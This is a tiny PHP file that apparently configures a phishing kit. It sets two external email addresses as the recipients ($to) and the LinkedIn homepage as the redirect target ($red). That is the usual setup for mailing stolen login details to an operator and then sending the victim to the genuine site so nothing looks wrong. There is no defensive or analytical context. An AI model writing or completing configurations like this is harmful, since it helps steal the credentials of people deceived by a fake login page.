<?

$to = "bennywise4@protonmail.com, bennywise4@yandex.com";

$red = "https://www.linkedin.com/";

?>